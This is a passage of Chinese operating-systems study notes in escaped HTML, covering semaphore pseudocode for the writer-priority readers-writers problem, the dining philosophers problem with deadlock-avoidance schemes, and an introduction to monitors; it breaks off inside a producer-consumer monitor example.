&lt;p&gt;3、任一写者在完成写操作之前不允许其他读者或写者工作&lt;/p&gt;
&lt;p&gt;4、写者执行写操作前，应让已有的读者和写者全部退出&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;semaphore rw&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 用于实现对文件的互斥访问。表示当前是否有进程在访问共享文件&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; count&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 记录当前有几个读进程在访问文件&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;semaphore mutex&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 用于保证对 count 变量的互斥访问&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;semaphore w&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 用于实现 “写优先”&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;writer&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        P（w）&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rw&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 写之前 “加锁”&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        写文件。。。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        V（rw&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 写之后 “解锁”&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    	&lt;span class=&#34;token function&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;w&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;reader&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;w&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	    &lt;span class=&#34;token function&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mutex&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;// 各读进程互斥访问 count&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;count&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token function&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rw&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 第一个读进程的读进程数 + 1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        count&lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;	&lt;span class=&#34;token comment&#34;&gt;// 访问文件的读进程数 + 1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mutex&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;	&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;w&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        读文件&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mutex&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;	&lt;span class=&#34;token comment&#34;&gt;// 各读进程互斥访问 count&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        count&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;	&lt;span class=&#34;token comment&#34;&gt;// 访问文件的读进程数 - 1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;count&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token function&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rw&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;	&lt;span class=&#34;token comment&#34;&gt;// 最后一个读进程负责 “解锁”&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mutex&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1234567891011121314151617181920212223242526272829303132&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;23_10-哲学家进餐问题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#23_10-哲学家进餐问题&#34;&gt;#&lt;/a&gt; 2.3_10 哲学家进餐问题&lt;/h3&gt;
&lt;p&gt;五个人，必须拿左右的筷子才能吃饭&lt;/p&gt;
&lt;p&gt;避免死锁发生&lt;/p&gt;
&lt;p&gt;解决方案：&lt;br&gt;
1、可以对哲学家进程施加一些限制条件，比如最多允许四个哲学家同时进餐，这样可以保证至少有一个哲学家是可以拿到左右两只筷子的。&lt;/p&gt;
&lt;p&gt;2、要求奇数号哲学家先拿左边的筷子，然后再拿右边的筷子，而偶数号哲学家刚好相反。用这种方法可以保证如果相邻的两个奇偶号哲学家都想吃饭，那么只会有其中一个可以拿起第一只筷子，另一个会直接阻塞。这就避免了占有一只后再等待另一只的情况。&lt;/p&gt;
&lt;p&gt;3、仅当一个哲学家左右两只筷子都可用时才允许他抓起筷子。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;semaphore chopstick&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;semaphore mutex &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 互斥地取筷子&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Pi&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;				 &lt;span class=&#34;token comment&#34;&gt;//i 号哲学家的进程&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mutex&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;chopstick&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;      &lt;span class=&#34;token comment&#34;&gt;// 拿右&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;chopstick&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 拿左&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mutex&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        吃饭&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;chopstick&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;chopstick&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        思考&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1234567891011121314&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;23_11-管程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#23_11-管程&#34;&gt;#&lt;/a&gt; 2.3_11 管程&lt;/h3&gt;
&lt;p&gt;1、为什么要引入管程&lt;/p&gt;
&lt;p&gt;PV 操作容易出错、困难&lt;/p&gt;
&lt;p&gt;2、管程的定义和基本特征&lt;/p&gt;
&lt;p&gt;定义：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;局部于管程的共享数据结构说明&lt;/li&gt;
&lt;li&gt;对该数据结构进程操作的一组过程&lt;/li&gt;
&lt;li&gt;对局部于管程的共享数据设置初始值的语句&lt;/li&gt;
&lt;li&gt;管程有一个名字&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;基本特征：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;局部于管程数据结构只能被局部于管程的过程所访问&lt;/li&gt;
&lt;li&gt;一个进程只有通过调用管程内的过程才能进入管程访问共享数据&lt;/li&gt;
&lt;li&gt;每次仅允许一个进程在管程内执行某个内部过程&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;心得：相当于 C++ 的类，管程是数据放在 private 中，函数放在 public 中&lt;/p&gt;
&lt;p&gt;拓展 1：用管程解决生产者消费者问题&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;monitor producerconsumer&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    condition full&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;empty&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; count &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;insert&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Item item&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;count &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; N&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token function&#34;&gt;wait&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;full&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        count&lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;insert_item&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;item&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;count &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token 